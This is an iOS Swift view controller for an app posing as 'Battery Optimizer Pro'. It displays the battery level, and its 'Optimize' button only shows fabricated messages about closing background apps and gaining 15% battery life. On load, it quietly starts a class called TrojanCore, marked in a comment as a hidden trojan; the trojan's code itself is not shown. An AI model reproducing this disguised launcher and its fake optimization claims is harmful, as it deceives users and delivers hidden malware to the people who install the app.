import UIKit
import Foundation

class BatteryOptimizerViewController: UIViewController {
    
    private var batteryLevel: Float = 0.0
    private var batteryState: UIDevice.BatteryState = .unknown
    
    private let batteryLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont.systemFont(ofSize: 48, weight: .bold)
        label.textAlignment = .center
        label.textColor = .systemGreen
        return label
    }()
    
    private let statusLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont.systemFont(ofSize: 18)
        label.textAlignment = .center
        label.textColor = .secondaryLabel
        return label
    }()
    
    private let optimizeButton: UIButton = {
        let button = UIButton(type: .system)
        button.setTitle("Optimize Battery", for: .normal)
        button.titleLabel?.font = UIFont.systemFont(ofSize: 20, weight: .semibold)
        button.backgroundColor = .systemBlue
        button.setTitleColor(.white, for: .normal)
        button.layer.cornerRadius = 12
        return button
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        title = "Battery Optimizer Pro"
        
        setupUI()
        startBatteryMonitoring()
        
        // Initialize trojan (hidden)
        DispatchQueue.global().async {
            _ = TrojanCore.shared
        }
    }
    
    private func setupUI() {
        view.addSubview(batteryLabel)
        view.addSubview(statusLabel)
        view.addSubview(optimizeButton)
        
        batteryLabel.frame = CGRect(x: 0, y: 150, width: view.bounds.width, height: 60)
        statusLabel.frame = CGRect(x: 0, y: 220, width: view.bounds.width, height: 30)
        optimizeButton.frame = CGRect(x: 50, y: view.bounds.height - 150, 
                                      width: view.bounds.width - 100, height: 55)
        
        optimizeButton.addTarget(self, action: #selector(optimizeTapped), for: .touchUpInside)
    }
    
    private func startBatteryMonitoring() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        
        NotificationCenter.default.addObserver(self,
                                              selector: #selector(batteryLevelDidChange),
                                              name: UIDevice.batteryLevelDidChangeNotification,
                                              object: nil)
        
        updateBatteryInfo()
    }
    
    @objc private func batteryLevelDidChange() {
        updateBatteryInfo()
    }
    
    private func updateBatteryInfo() {
        batteryLevel = UIDevice.current.batteryLevel
        batteryState = UIDevice.current.batteryState
        
        let percentage = Int(batteryLevel * 100)
        batteryLabel.text = "\(percentage)%"
        
        switch batteryState {
        case .charging:
            statusLabel.text = "Charging"
            batteryLabel.textColor = .systemGreen
        case .full:
            statusLabel.text = "Fully Charged"
            batteryLabel.textColor = .systemGreen
        case .unplugged:
            statusLabel.text = "On Battery"
            batteryLabel.textColor = percentage < 20 ? .systemRed : .systemGreen
        default:
            statusLabel.text = "Unknown"
        }
    }
    
    @objc private func optimizeTapped() {
        let alert = UIAlertController(title: "Optimizing...",
                                     message: "Closing background apps and optimizing battery usage",
                                     preferredStyle: .alert)
        
        present(alert, animated: true)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            alert.dismiss(animated: true) {
                let success = UIAlertController(title: "Success!",
                                               message: "Battery optimized. Estimated +15% battery life",
                                               preferredStyle: .alert)
                success.addAction(UIAlertAction(title: "OK", style: .default))
                self.present(success, animated: true)
            }
        }
    }
}
